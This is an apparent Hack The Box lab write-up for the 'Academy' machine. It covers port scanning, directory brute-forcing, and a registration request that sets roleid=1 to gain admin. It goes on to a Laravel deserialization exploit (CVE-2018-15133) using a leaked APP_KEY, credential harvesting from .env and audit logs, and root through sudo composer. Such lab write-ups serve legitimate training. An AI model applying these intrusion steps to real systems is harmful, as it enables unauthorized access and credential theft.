# [Academy](https://app.hackthebox.com/machines/academy)

```bash
nmap -p- --min-rate 10000  10.10.10.215  
```

![Alt text](img/image.png)


After we see that (22,80,33060) ports are open, let's do greater nmap scan.

```bash
nmap -A -sC -sV -p22,80,33060 10.10.10.215
```

![Alt text](img/image-1.png)


We see that this IP Address resolves into 'academy.htb' , let's add into `/etc/hosts` file.

![Alt text](img/image-2.png)


Let's do directory brute-forcing.

```bash
gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40
```

![Alt text](img/image-3.png)



Here, I found 'register.php' endpoint to create user account.
While intercepting this request, I see that '**roleid**' into 1 to be admin user.

![Alt text](img/image-4.png)

```bash
uid=dr4ks&password=Dr4ks&confirm=Dr4ks&roleid=1
```

![Alt text](img/image-5.png)


From here, we see that 'dev-staging-01.academy.htb' , let's add this subdomain into `/etc/hosts` file.

This is actually dev state that's why debug mode is runned that's why we can see all stuff.

![Alt text](img/image-6.png)


I found exploit 'CVE-2018-15133'

![Alt text](img/image-7.png)

Let's grab app key from here.

```bash
APP_KEY = base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
```

Let's use exploit `exploit/unix/http/laravel_token_unserialize_exec`

![Alt text](img/image-8.png)


![Alt text](img/image-9.png)

Make interactive shell.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
```

I enumerate users.

![Alt text](img/image-10.png)

On 'var/www/html/academy' directory, I found '.env' file which contains credentials.

![Alt text](img/image-11.png)


cry0l1t3:mySup3rP4s5w0rd!!

user.txt

![Alt text](img/image-12.png)

I see that my user is `adm` group.

![Alt text](img/image-13.png)


Let's read this to switch into another user by reading [this](https://support.oracle.com/knowledge/Oracle%20Linux%20and%20Virtualization/2239220_1.html)

![Alt text](img/image-14.png)


From here, I see credentials..

![Alt text](img/image-15.png)

![Alt text](img/image-16.png)

I grab credentials.

mrb3n:mrb3n_Ac@d3my!


Let' ssh into machine via above credentials.

I check privileges of my user via `sudo -l` commnad.

![Alt text](img/image-17.png)


Let's read [this](https://gtfobins.github.io/gtfobins/composer/) for `composer` binary.


root.txt

![Alt text](img/image-18.png)
